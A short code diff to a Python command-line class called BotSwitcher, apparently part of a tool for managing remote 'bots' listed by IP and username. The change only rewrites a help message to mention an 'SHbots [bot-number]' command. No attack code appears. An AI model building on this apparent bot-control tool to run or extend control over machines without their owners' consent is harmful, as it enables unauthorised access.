@@ -395,7 +395,7 @@ class BotSwitcher(cmd.Cmd):
                         active_bots_str += '\n\tBot # {}\t\t{}\t{}'.format(bots_counter, bot['ip'], bot['username'])
                     else:
                         inactive_bots_str += '\n\tBot # {}\t\t{}\t{}'.format(bots_counter, bot['ip'], bot['username'])
-                printable_bots = active_bots_str + inactive_bots_str + '\n\n\nYou can interact with a bot by entering its number #'
+                printable_bots = active_bots_str + inactive_bots_str + '\n\n\nYou can interact with a bot using "SHbots [bot-number]"\n'
                 logging(data_to_log=printable_bots, printer=True)
             elif option.isdigit() is True:
                 try:
